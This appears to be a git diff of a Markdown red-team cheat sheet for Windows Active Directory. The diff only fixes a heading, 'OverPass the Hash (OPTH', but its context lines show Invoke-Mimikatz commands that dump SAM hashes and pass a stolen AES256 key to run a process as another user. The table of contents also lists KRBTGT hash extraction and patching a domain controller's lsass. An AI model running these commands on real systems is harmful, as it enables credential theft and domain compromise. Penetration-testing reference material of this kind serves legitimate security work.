@@ -9,7 +9,7 @@
     + [Execute Remote Command](#execute-remote-command)
 - [MimiKatz PowerShell Port](#mimikatz-powershell-port)
     + [Dump Credentials on Local Machine](#dump-credentials-on-local-machine)
-    + [OverPass the Hash (OPTH](#overpass-the-hash--opth)
+    + [OverPass the Hash](#overpass-the-hash)
     + [Get KRBTGT Hash](#get-krbtgt-hash)
     + [Credentials from Credential Vault](#credentials-from-credential-vault)
     + [Patch a DC `lsass` process** allowing to use any user with single password. DA privileges are required.](#patch-a-dc--lsass--process---allowing-to-use-any-user-with-single-password-da-privileges-are-required)
@@ -106,7 +106,7 @@ C:> Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 ```powershell
 C:> Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
 ```
-##### OverPass the Hash (OPTH
+##### OverPass the Hash
 ```powershell
 # Starts Powershell with logon type 9
 C:> Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<fqdn_domain> /aes256:<user_aes256key> /run:cmd.exe"'
